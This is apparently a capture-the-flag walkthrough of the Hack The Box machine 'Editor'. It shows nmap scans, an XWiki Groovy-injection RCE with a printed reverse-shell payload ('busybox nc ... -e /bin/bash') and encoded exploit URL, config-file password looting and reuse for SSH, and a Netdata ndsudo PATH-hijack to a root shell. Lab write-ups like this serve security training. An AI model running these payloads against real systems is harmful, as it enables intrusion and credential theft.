I start with an nmap scan
```bash
nmap -p- -T4-min-rate=10000 10.10.11.80 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 18:39 EEST
Warning: 10.10.11.80 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.80
Host is up (0.055s latency).
Not shown: 65440 closed tcp ports (reset), 92 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 827.82 seconds
```
```bash
nmap -p 22,80,8080 -sC -sV -A 10.10.11.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 19:53 EEST
Nmap scan report for 10.10.11.80
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   955.87 ms 10.10.14.1
2   983.70 ms 10.10.11.80

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.10 seconds
```
There wasn't much to go after but on the :8080 port there was a possible exploitation of the XWIKI site.
https://www.offsec.com/blog/cve-2025-24893/

```bash
python3 CVE-2024-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.81 4444 -e /bin/bash'
[*] Attacking http://editor.htb:8080
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.81%204444%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D                                                           q
[*] Command executed

~Happy Hacking
```
And would you look at that now we have a RCE.
```bash
nc -lvnp 4444                            
listening on [any] 4444 ...
connect to [10.10.14.81] from (UNKNOWN) [10.10.11.80] 51508
whoami
xwiki
id
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
```
That's great now its time to do some enumerating
Lets make the shell more interactive with
```bash
script /dev/null -c bash
```
Found this interesting email
```bash
xwiki@editor:~/data/mails/02a2e893-3b5e-42f0-9f8b-8977fed28486$ cat zjo9YETtgCVnF5vfV6py1N6u8pE%3D
<8b-8977fed28486$ cat zjo9YETtgCVnF5vfV6py1N6u8pE%3D            
Date: Sun, 10 Aug 2025 22:53:01 +0000 (UTC)
From: no-reply@editor.htb
To: neal@editor.htb
Message-ID: <295387603.8.1754866381330@editor>
Subject: Password reset request for Neal Bagwell
MIME-Version: 1.0
Content-Type: multipart/mixed; 
        boundary="----=_Part_6_551030275.1754866381232"
X-MailType: Reset Password

------=_Part_6_551030275.1754866381232
Content-Type: multipart/alternative; 
        boundary="----=_Part_7_764906366.1754866381236"

------=_Part_7_764906366.1754866381236
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Hello Neal Bagwell,

A password reset was requested for your account (Neal Bagwell) on editor.htb.
If you did not make the request, please ignore this message.

In order to reset your password, please follow this link:

http://editor.htb:8080/xwiki/authenticate/wiki/xwiki/resetpassword?u=xwiki%3AXWiki.neal&v=U8ZY5mzYliAcKfvoE4RtRoOtfXKj2q

------=_Part_7_764906366.1754866381236
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit

<h2>Hello Neal Bagwell,</h2>
<p>A password reset was requested for your account (Neal Bagwell) on <a href="http://editor.htb:8080/xwiki/bin/view/Main/">editor.htb</a>.
If you did not make the request, please ignore this message.</p>
<p>In order to reset your password, please follow this link:<br/>
<a href="http://editor.htb:8080/xwiki/authenticate/wiki/xwiki/resetpassword?u=xwiki%3AXWiki.neal&#38;v=U8ZY5mzYliAcKfvoE4RtRoOtfXKj2q">http://editor.htb:8080/xwiki/authenticate/wiki/xwiki/resetpassword?u=xwiki%3AXWiki.neal&#38;v=U8ZY5mzYliAcKfvoE4RtRoOtfXKj2q</a></p>

------=_Part_7_764906366.1754866381236--

------=_Part_6_551030275.1754866381232--

```
We can use it to change the email of Neal Bagwell who seems to be an administrator on the website

```bash
xwiki@editor:/etc/xwiki$ grep -r "password" /etc/xwiki 2>/dev/null   
grep -r "password" /etc/xwiki 2>/dev/null 
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
/etc/xwiki/xwiki.properties:#-# * password: the password to use to authenticate to the repository
/etc/xwiki/xwiki.properties:# extension.repositories.privatemavenid.auth.password = thepassword
/etc/xwiki/xwiki.properties:#-# Define the lifetime of the token used for resetting passwords in minutes. Note that this value is only used after
/etc/xwiki/xwiki.properties:#-# Use a different value if the reset password email link might be accessed several times (e.g. in case of using an
/etc/xwiki/xwiki.properties:#-# This parameter defines if as part of the migration R140600000XWIKI19869 the passwords of impacted user should be
/etc/xwiki/xwiki.properties:#-# their users to keep their passwords nevertheless, then enable the configuration and set it to false before the
/etc/xwiki/xwiki.properties:#-# This parameter defines if reset password emails should be sent as part of the migration R140600000XWIKI19869.
/etc/xwiki/xwiki.properties:#-# this option to false: note that in such case a file containing the list of users for whom a reset password email
/etc/xwiki/xwiki.properties:#-# this option to false: note that in such case a file containing the list of users for whom a reset password email
/etc/xwiki/xwiki.properties:#-# This configuration property can be overridden in XWikiPreferences objects, by using the "smtp_server_password"
/etc/xwiki/xwiki.properties:# mail.sender.password = somepassword
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwikipassword2025</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password"></property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password"></property>
/etc/xwiki/fonts/LICENSE-freefont:source code form), and must require no special password or key for
/etc/xwiki/xwiki.cfg:# xwiki.superadminpassword=system
```
There we can see that the password is theEd1t0rTeam99
I tried it for oliver and got ssh. Now that i have ssh access I portforwarded the tcp sites of the localhost to my pc and tried opening them. Most of them had nothing except for 127.0.0.1:19999 had a website for netdata which is an opensource tool for all kinds of widgets.

```bash
Node is below the recommended Agent version v1.46.0. Please update them to ensure you get the latest security bug fixes.
```
Interesting...
```bash
https://www.cve.org/CVERecord?id=CVE-2024-32019
https://github.com/AliElKhatteb/CVE-2024-32019-POC
```

Ok so first we download the CVE from github and then we change the insides of it to get a root revshell on our machine. then we transport the exploit over to the target
```bash
┌──(kali㉿kali)-[~/exploit/CVE-2024-32019-POC]
└─$ x86_64-linux-gnu-gcc -o nvme exploit.c -static
                                                                                                                                  
┌──(kali㉿kali)-[~/exploit/CVE-2024-32019-POC]
└─$ scp nvme oliver@10.10.11.80:~                 
oliver@10.10.11.80's password: 
nvme                                                                                            100%  741KB 594.1KB/s   00:01
```
Then we change it to be an executable and change our $PATH that the netdata runs out exploit script instead of the script that it was supposed to run.
```bash
oliver@editor:~$ ls
nvme  user.txt
oliver@editor:~$ chmod +x nvme
oliver@editor:~$ PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
bash: line 1: /dev/tcp/10.10.14.81: No such file or directory
oliver@editor:~$ ls
nvme  user.txt
oliver@editor:~$ rm nvme 
oliver@editor:~$ ls
nvme  user.txt
oliver@editor:~$ chmod +x nvme
oliver@editor:~$ PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
Then we just setup netcat on the port that we put into the exploit and we gain a root shell
```bash
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.81] from (UNKNOWN) [10.10.11.80] 46118
root@editor:/home/oliver# whoami
whoami
root
root@editor:/home/oliver# cat /root/root.txt
cat /root/root.txt
856813ca5d7cdb5b48e5bb43e74f6dc5
root@editor:/home/oliver# 
```
Beautiful

